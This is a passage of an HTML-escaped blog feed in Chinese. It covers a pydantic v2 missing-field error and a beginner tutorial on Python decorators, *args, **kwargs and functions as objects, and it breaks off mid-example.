z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;比如这个代码，如果不对每个参数进行赋初值的话将会报错：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; class=&quot;language-shell z-code&quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;pydantic_core._pydantic_core.ValidationError: 1 validation error for Config
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;weather_api_key
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  Field required [type=missing, input_value={&amp;#39;driver&amp;#39;: &amp;#39;~fastapi&amp;#39;, &amp;#39;h...), &amp;#39;environment&amp;#39;: &amp;#39;dev&amp;#39;}, input_type=dict]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    For further information visit https:&#x2F;&#x2F;errors.pydantic.dev&#x2F;2.10&#x2F;v&#x2F;missing
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;因为更新到2.x版本后不能用缺省的None了&lt;&#x2F;p&gt;
&lt;p&gt;参考:&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;segmentfault.com&#x2F;a&#x2F;1190000044459293&quot;&gt;pydantic v1 迁移到 v2 需要注意的事项 - python后端实战经验分享 - SegmentFault 思否&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="zh">
		<title>Decorator learning Python</title>
		<published>2024-01-24T00:00:00+00:00</published>
		<updated>2024-01-24T00:00:00+00:00</updated>
		<link href="https://lbsucceed.github.io/posts/decorator-learning/" type="text/html"/>
		<id>https://lbsucceed.github.io/posts/decorator-learning/</id>
		<content type="html">&lt;h2 id=&quot;zhuang-shi-qi-chu-bu&quot;&gt;装饰器初步&lt;a class=&quot;zola-anchor&quot; href=&quot;#zhuang-shi-qi-chu-bu&quot; aria-label=&quot;Anchor link for: zhuang-shi-qi-chu-bu&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;p&gt;所谓装饰器，decorators，就是修改其他函数的功能的函数。他们有助于让我们的代码更简短，也更Pythonic。&lt;&#x2F;p&gt;
&lt;p&gt;先让我们了解一下普通的函数。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;位置传参和可变长度搭配传参&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-storage z-type z-function z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-function z-python&quot;&gt;def&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;foo5&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-variable z-parameter z-python&quot;&gt;value&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-parameters z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-unpacking z-sequence z-python&quot;&gt;*&lt;&#x2F;span&gt;&lt;span class=&quot;z-variable z-parameter z-python&quot;&gt;args&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-function z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;value&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;args&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;foo5&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;1&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;2&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;3&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;4&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;5&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; 第一个参数按照位置传参，剩余的被 *args 收集
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;strong&gt;接收任意长度的key=value形式的参数，并收集到一个字典内，一般在所有的参数的后面&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-storage z-type z-function z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-function z-python&quot;&gt;def&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;foo7&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-keyword z-operator z-unpacking z-mapping z-python&quot;&gt;**&lt;&#x2F;span&gt;&lt;span class=&quot;z-variable z-parameter z-python&quot;&gt;kwargs&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-function z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;kwargs&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; {&amp;#39;a&amp;#39;: 1, &amp;#39;b&amp;#39;: 2, &amp;#39;c&amp;#39;: 3}
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;foo7&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-variable z-parameter z-python&quot;&gt;a&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;1&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-variable z-parameter z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;2&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-variable z-parameter z-python&quot;&gt;c&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;3&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;strong&gt;函数可以被引用&lt;&#x2F;strong&gt; 因为都是对象`&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-storage z-type z-function z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-function z-python&quot;&gt;def&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;foo&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-function z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-keyword z-control z-flow z-return z-python&quot;&gt;return&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;ok&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f1&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;foo&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;f1: &lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f1&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;        		&lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; f1:  ok  
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f2&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;foo&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;f2: &lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f2&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;        		&lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; f2:  &amp;lt;function foo at 0x00373A98&amp;gt;  
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;f2(): &lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;f2&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;    		&lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; f2():  ok  
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;而在第5行将&lt;code&gt;foo&lt;&#x2F;code&gt;函数被变量&lt;code&gt;f2&lt;&#x2F;code&gt;引用后，此时打印的（第6行）为&lt;code&gt;foo&lt;&#x2F;code&gt;的内存地址，而&lt;code&gt;f2&lt;&#x2F;code&gt;加括号（第7行）触发了&lt;code&gt;foo&lt;&#x2F;code&gt;函数的执行。返回“ok“。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;函数可以当做函数的参数&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-storage z-type z-function z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-function z-python&quot;&gt;def&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;bar&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-function z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;a&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-python&quot;&gt;1&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-python&quot;&gt;a =&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-arguments z-python&quot;&gt;,&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;a&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-storage z-type z-function z-python&quot;&gt;&lt;span class=&quot;z-keyword z-declaration z-function z-python&quot;&gt;def&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;foo&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-python&quot;&gt;&lt;span class=&quot;z-variable z-parameter z-python&quot;&gt;b&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-parameters z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-function z-begin z-python&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-keyword z-control z-flow z-pass z-python&quot;&gt;pass&lt;&#x2F;span&gt;  
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;foo&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;bar&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;            
